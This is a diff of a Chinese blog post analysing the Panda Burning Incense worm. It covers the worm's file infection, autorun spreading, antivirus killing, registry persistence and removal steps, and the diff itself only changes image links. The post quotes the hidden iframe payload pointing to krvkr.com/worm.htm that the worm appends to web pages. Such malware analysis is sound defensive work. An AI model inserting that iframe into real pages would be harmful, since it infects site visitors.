@@ -188,63 +188,63 @@
 <p>该函数由3个主要函数，第一个执行感染功能，第二个实现自我复制，第三个局域网传播自身。</p>
 <p><img src="http://yusakul-blog.oss-cn-shenzhen.aliyuncs.com/18-7-13/99454191.jpg" alt=""></p>
 <h4 id="感染文件线程"><a href="#感染文件线程" class="headerlink" title="感染文件线程"></a>感染文件线程</h4><p>（1）遍历文件夹，判断是否为文件夹，判断目录下是否存在Desktop_.ini文件。</p>
-<p><img src="/2018/07/13/病毒分析报告-熊猫烧香 /0b6a0697fa3b9220fa54e9acd374cce5.png" alt=""></p>
+<p><img src="http://yusakul-blog.oss-cn-shenzhen.aliyuncs.com/18-7-25/74585640.jpg" alt=""></p>
 <p>判断是否存在Desktop_.ini</p>
-<p><img src="/2018/07/13/病毒分析报告-熊猫烧香 /43d44acfe67224e8ea633c8218b50f52.png" alt="C:\\Users\\Administrator\\Desktop\\xmsx\\2018-07-12_190048.png"></p>
+<p><img src="http://yusakul-blog.oss-cn-shenzhen.aliyuncs.com/18-7-25/99653605.jpg" alt=""></p>
 <p>（2）若目录下存在Desktop_.ini，获取当前系统时间，对比Desktop_.ini中的时间，是同一天则表示此目录已被感染，跳过此目录。</p>
-<p><img src="/2018/07/13/病毒分析报告-熊猫烧香 /faad17a72330f7ce494d9bb01229d974.png" alt=""></p>
+<p><img src="http://yusakul-blog.oss-cn-shenzhen.aliyuncs.com/18-7-25/84129778.jpg" alt=""></p>
 <p>若不同则在此目录下生成新的Desktop_.ini，写入本地时间。</p>
-<p><img src="/2018/07/13/病毒分析报告-熊猫烧香 /93ce42aca0f334fb486b53c1552cab24.png" alt="C:\\Users\\Administrator\\Desktop\\xmsx\\2018-07-12_191238.png"></p>
+<p><img src="http://yusakul-blog.oss-cn-shenzhen.aliyuncs.com/18-7-25/69985449.jpg" alt=""></p>
 <p>（3）删除GHO备份</p>
-<p><img src="/2018/07/13/病毒分析报告-熊猫烧香 /fc32fab8c108ce7c50086ee0d42a274f.png" alt=""></p>
+<p><img src="http://yusakul-blog.oss-cn-shenzhen.aliyuncs.com/18-7-25/2698972.jpg" alt=""></p>
 <p>（4）感染PE文件 – 感染方式1</p>
 <p>将病毒内容直接覆盖到要感染程序，感染目标文件后缀类型有：EXE、SCR、PIF、COM。</p>
-<p><img src="/2018/07/13/病毒分析报告-熊猫烧香 /daac6bc4eda8feefda603aa50c6d1219.png" alt=""></p>
+<p><img src="http://yusakul-blog.oss-cn-shenzhen.aliyuncs.com/18-7-25/33629525.jpg" alt=""></p>
 <p>f_HackWay1:</p>
-<p><img src="/2018/07/13/病毒分析报告-熊猫烧香 /31877e5ba482d9a513f2db63cfe40d2e.png" alt="C:\\Users\\Administrator\\Desktop\\xmsx\\2018-07-12_201716.png"></p>
+<p><img src="http://yusakul-blog.oss-cn-shenzhen.aliyuncs.com/18-7-25/17468182.jpg" alt=""></p>
 <p>（5）感染PE文件 – 感染方式2</p>
 <p>网页感染：感染目标文件后缀类型有：htm, html, asp, php, jsp, aspx。</p>
 <p>主要将字符串（\&lt;iframe src=<a href="http://www.krvkr.com/worm.htm" target="_blank" rel="noopener">http://www.krvkr.com/worm.htm</a> width=0<br>height=0>\&lt;/iframe>）添加到文件末尾。</p>
-<p><img src="/2018/07/13/病毒分析报告-熊猫烧香 /3d599eb3df0203a85dacb153c0d2f5b2.png" alt=""></p>
+<p><img src="http://yusakul-blog.oss-cn-shenzhen.aliyuncs.com/18-7-25/21895855.jpg" alt=""></p>
 <p>f_HackWays:</p>
-<p><img src="/2018/07/13/病毒分析报告-熊猫烧香 /c5e447aa7ca95e270464cc0e791dfa15.png" alt=""></p>
-<h4 id="2-自我复制-时钟周期6s"><a href="#2-自我复制-时钟周期6s" class="headerlink" title="2. 自我复制 - 时钟周期6s"></a>2. 自我复制 - 时钟周期6s</h4><p><img src="/2018/07/13/病毒分析报告-熊猫烧香 /96329f95d5f86de4586e8b5b7d56a72d.png" alt=""></p>
+<p><img src="http://yusakul-blog.oss-cn-shenzhen.aliyuncs.com/18-7-25/73017774.jpg" alt=""></p>
+<h4 id="2-自我复制-时钟周期6s"><a href="#2-自我复制-时钟周期6s" class="headerlink" title="2. 自我复制 - 时钟周期6s"></a>2. 自我复制 - 时钟周期6s</h4><p><img src="http://yusakul-blog.oss-cn-shenzhen.aliyuncs.com/18-7-25/37432101.jpg" alt=""></p>
 <p>检索各个磁盘的根目录是否存在setup.exe和autorun.inf文件，存在则删除它们。</p>
-<p><img src="/2018/07/13/病毒分析报告-熊猫烧香 /52796156c82ef182a8d0ce6ed8866029.png" alt="C:\\Users\\Administrator\\Desktop\\xmsx\\2018-07-12_211750.png"></p>
+<p><img src="http://yusakul-blog.oss-cn-shenzhen.aliyuncs.com/18-7-25/60949900.jpg" alt=""></p>
 <p>将自身复制到 盘符:\setup.exe</p>
-<p><img src="/2018/07/13/病毒分析报告-熊猫烧香 /bab59d094eae3ba5ac12da9e71d4bbf0.png" alt=""></p>
+<p><img src="http://yusakul-blog.oss-cn-shenzhen.aliyuncs.com/18-7-25/22780219.jpg" alt=""></p>
 <p>遍历磁盘, 创建“盘符:\autorun.inf”文件。</p>
-<p><img src="/2018/07/13/病毒分析报告-熊猫烧香 /43f774f9d3d45cba2e7c1c32d7c7f033.png" alt=""></p>
+<p><img src="http://yusakul-blog.oss-cn-shenzhen.aliyuncs.com/18-7-25/75219686.jpg" alt=""></p>
 <p>设置setup.exe文件属性为 \&lt;系统,隐藏></p>
-<p><img src="/2018/07/13/病毒分析报告-熊猫烧香 /35c6d3c3602e7f215ba507ff62dc86fc.png" alt=""></p>
+<p><img src="http://yusakul-blog.oss-cn-shenzhen.aliyuncs.com/18-7-25/25915941.jpg" alt=""></p>
 <p>设置autorun.inf文件属性为 \&lt;系统，隐藏>，同时将setup.exe设置为自启</p>
-<p><img src="/2018/07/13/病毒分析报告-熊猫烧香 /cc0bd28de1384b15ed5fc4452bc57ed1.png" alt=""></p>
-<h4 id="3-局域网传播"><a href="#3-局域网传播" class="headerlink" title="3. 局域网传播"></a>3. 局域网传播</h4><p><img src="/2018/07/13/病毒分析报告-熊猫烧香 /3f3ba872ec86ee495c56974d42b7b775.png" alt=""></p>
+<p><img src="http://yusakul-blog.oss-cn-shenzhen.aliyuncs.com/18-7-25/7653560.jpg" alt=""></p>
+<h4 id="3-局域网传播"><a href="#3-局域网传播" class="headerlink" title="3. 局域网传播"></a>3. 局域网传播</h4><p><img src="http://yusakul-blog.oss-cn-shenzhen.aliyuncs.com/18-7-25/96007106.jpg" alt=""></p>
 <h3 id="2-2-4-主要功能函数sub-40D088-–-其他"><a href="#2-2-4-主要功能函数sub-40D088-–-其他" class="headerlink" title="2.2.4 主要功能函数sub_40D088 – 其他"></a>2.2.4 主要功能函数sub_40D088 – 其他</h3><p>此函数主要功能为通过修改注册表实现自我保护，连接网站实现自我更新等功能。</p>
 <p>该函数中设置了6个时钟周期，定时执行不同的功能。</p>
-<p><img src="/2018/07/13/病毒分析报告-熊猫烧香 /072794ed92a01811679be3ba3c551aec.png" alt="C:\\Users\\Administrator\\Desktop\\xmsx\\2018-07-12_140852.png"></p>
+<p><img src="http://yusakul-blog.oss-cn-shenzhen.aliyuncs.com/18-7-25/171440.jpg" alt=""></p>
 <h4 id="TimerFunc-1（1s）"><a href="#TimerFunc-1（1s）" class="headerlink" title="TimerFunc_1（1s）"></a>TimerFunc_1（1s）</h4><p>（1）提升进程权限</p>
 <p>（2）遍历窗口名, 向指定窗口名发送QUIT消息, 并结束指定进程，大多为杀毒防护软件。</p>
-<p><img src="/2018/07/13/病毒分析报告-熊猫烧香 /0fd68e49dbd870b0dc8c707816cd9ae5.png" alt="C:\\Users\\Administrator\\Desktop\\xmsx\\2018-07-12_140723.png"></p>
+<p><img src="http://yusakul-blog.oss-cn-shenzhen.aliyuncs.com/18-7-25/55370160.jpg" alt=""></p>
 <p>（3）扫描进程，如果有检测到以下进程则结束它，下图为部分截图：</p>
-<p><img src="/2018/07/13/病毒分析报告-熊猫烧香 /e94b531bd2b9e657b20e2e08d2e8d470.png" alt=""></p>
+<p><img src="http://yusakul-blog.oss-cn-shenzhen.aliyuncs.com/18-7-25/39153235.jpg" alt=""></p>
 <p>（4）修改注册表，设置spo0lsv.exe开机启动，设置文件（夹）隐藏</p>
-<p><img src="/2018/07/13/病毒分析报告-熊猫烧香 /aaf2a1263ad32518683fd9a2aa36a1f6.png" alt=""></p>
-<p><img src="/2018/07/13/病毒分析报告-熊猫烧香 /79bb7158fbc82b927795d121ffb8f115.png" alt=""></p>
+<p><img src="http://yusakul-blog.oss-cn-shenzhen.aliyuncs.com/18-7-25/89892922.jpg" alt=""></p>
+<p><img src="http://yusakul-blog.oss-cn-shenzhen.aliyuncs.com/18-7-25/94547961.jpg" alt=""></p>
 <h4 id="TimerFunc-2（1200s）"><a href="#TimerFunc-2（1200s）" class="headerlink" title="TimerFunc_2（1200s）"></a>TimerFunc_2（1200s）</h4><p>通过URL地址更新</p>
-<p><img src="/2018/07/13/病毒分析报告-熊猫烧香 /be676bc87e3e64ffa6bd7bd897019c81.png" alt=""></p>
+<p><img src="http://yusakul-blog.oss-cn-shenzhen.aliyuncs.com/18-7-25/3012923.jpg" alt=""></p>
 <h4 id="TimerFunc-3（10s）"><a href="#TimerFunc-3（10s）" class="headerlink" title="TimerFunc_3（10s）"></a>TimerFunc_3（10s）</h4><p>（1）通过URL地址更新</p>
 <p>（2）删除网络共享：net share ipc\$ /del 删除ipc\$共享</p>
-<p><img src="/2018/07/13/病毒分析报告-熊猫烧香 /7a733a05a6b18e734baacc531e8d8a05.png" alt=""></p>
+<p><img src="http://yusakul-blog.oss-cn-shenzhen.aliyuncs.com/18-7-25/91921474.jpg" alt=""></p>
 <p>（3）关闭当前时钟</p>
-<p><img src="/2018/07/13/病毒分析报告-熊猫烧香 /6117ad7c44c521a42b711cc4dd95f9c0.png" alt=""></p>
+<p><img src="http://yusakul-blog.oss-cn-shenzhen.aliyuncs.com/18-7-25/37604458.jpg" alt=""></p>
 <h4 id="4-TimerFunc-4（6s）"><a href="#4-TimerFunc-4（6s）" class="headerlink" title="4. TimerFunc_4（6s）"></a>4. TimerFunc_4（6s）</h4><p>将杀毒软件服务停止，并删除注册表启动项。</p>
-<p><img src="/2018/07/13/病毒分析报告-熊猫烧香 /ef4d3a4770edc85052f8dd56965a560c.png" alt=""></p>
-<p><img src="/2018/07/13/病毒分析报告-熊猫烧香 /168579d479d66f9ceae38624f5c932a0.png" alt=""></p>
+<p><img src="http://yusakul-blog.oss-cn-shenzhen.aliyuncs.com/18-7-25/7252866.jpg" alt=""></p>
+<p><img src="http://yusakul-blog.oss-cn-shenzhen.aliyuncs.com/18-7-25/4643049.jpg" alt=""></p>
 <h4 id="TimerFunc-5（10s）"><a href="#TimerFunc-5（10s）" class="headerlink" title="TimerFunc_5（10s）"></a>TimerFunc_5（10s）</h4><p>字符串被加密操作过，根据特征猜测可能是网址，似乎是对一些网址做了操作。</p>
-<p><img src="/2018/07/13/病毒分析报告-熊猫烧香 /2b741b19c4024514ed63e91dc128b235.png" alt=""></p>
+<p><img src="http://yusakul-blog.oss-cn-shenzhen.aliyuncs.com/18-7-25/30201803.jpg" alt=""></p>
 <h4 id="TimerFunc-6（180s）"><a href="#TimerFunc-6（180s）" class="headerlink" title="TimerFunc_6（180s）"></a>TimerFunc_6（180s）</h4><p>仍然是从某个网址上下载文件，应该不是关键操作。</p>
-<p><img src="/2018/07/13/病毒分析报告-熊猫烧香 /62979bbba4fce074fa91517a10609822.png" alt=""></p>
+<p><img src="http://yusakul-blog.oss-cn-shenzhen.aliyuncs.com/18-7-25/33034215.jpg" alt=""></p>
 <h1 id="3．解决方案"><a href="#3．解决方案" class="headerlink" title="3．解决方案"></a>3．解决方案</h1><h2 id="3-1-病毒行为"><a href="#3-1-病毒行为" class="headerlink" title="3.1 病毒行为"></a>3.1 病毒行为</h2><p>病毒行为1：病毒本身创建了名为“spo01sv.exe”的进程，该进程文件的路径为“C:\WINDOWS\system32\drivers\spo01sv.exe”。</p>
 <p>病毒行为2：在注册表KCU\Software\Microsoft\Windows\CurrentVersio</p>
 <p>n\Run”中创建“svcshare”，用于在开机时启动位于“C:\WINDOWS\system3</p>
@@ -258,5 +258,5 @@
 <h3 id="3-2-2-删除文件"><a href="#3-2-2-删除文件" class="headerlink" title="3.2.2. 删除文件"></a>3.2.2. 删除文件</h3><p>调用函数Bool DeleteFile (LPCTSTR<br>lpFilename)，把lpFilename设为要指向删除的文件的文件名的指针即可,可以包含具体路径。</p>
 <h3 id="3-2-3-修复注册表，删除启动启动项"><a href="#3-2-3-修复注册表，删除启动启动项" class="headerlink" title="3.2.3 修复注册表，删除启动启动项"></a>3.2.3 修复注册表，删除启动启动项</h3><p>RegOpenKeyEx()打开目标主键,并返回句柄,然后利用RegSetValueEx进行修改键值,最后可以利用RegSetValueEx来删除键值,最后利用RegCloseKey来进行关闭。</p>
 <h3 id="3-2-3-查杀工具链接"><a href="#3-2-3-查杀工具链接" class="headerlink" title="3.2.3 查杀工具链接"></a>3.2.3 查杀工具链接</h3><p>我的GitHub·<a href="https://github.com/yusakul/PandaKiller" target="_blank" rel="noopener">https://github.com/yusakul/PandaKiller</a></p>
-<h3 id="3-2-4-工具截图"><a href="#3-2-4-工具截图" class="headerlink" title="3.2.4 工具截图"></a>3.2.4 工具截图</h3><p><img src="/2018/07/13/病毒分析报告-熊猫烧香 /cc6ba44f5a4339628248cbf7a10415d1.png" alt=""></p>
+<h3 id="3-2-4-工具截图"><a href="#3-2-4-工具截图" class="headerlink" title="3.2.4 工具截图"></a>3.2.4 工具截图</h3><p><img src="http://yusakul-blog.oss-cn-shenzhen.aliyuncs.com/18-7-25/28627363.jpg" alt=""></p>
 </div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">yusakul</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://yoursite.com/2018/07/13/病毒分析报告-熊猫烧香 /">http://yoursite.com/2018/07/13/病毒分析报告-熊猫烧香 /</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://yoursite.com" target="_blank">梁言</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/病毒/">病毒</a></div><nav id="pagination"><div class="next-post pull-right"><a href="/2018/07/06/AndroidStudio动态调试smali/"><span>AndroidStudio附加动态调试smali</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2018 By yusakul</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="/js/third-party/anime.min.js"></script><script src="/js/third-party/jquery.min.js"></script><script src="/js/third-party/jquery.fancybox.min.js"></script><script src="/js/third-party/velocity.min.js"></script><script src="/js/third-party/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.5.5"></script><script src="/js/fancybox.js?version=1.5.5"></script><script src="/js/sidebar.js?version=1.5.5"></script><script src="/js/copy.js?version=1.5.5"></script><script src="/js/fireworks.js?version=1.5.5"></script><script src="/js/transition.js?version=1.5.5"></script><script src="/js/scroll.js?version=1.5.5"></script><script src="/js/head.js?version=1.5.5"></script></body></html>
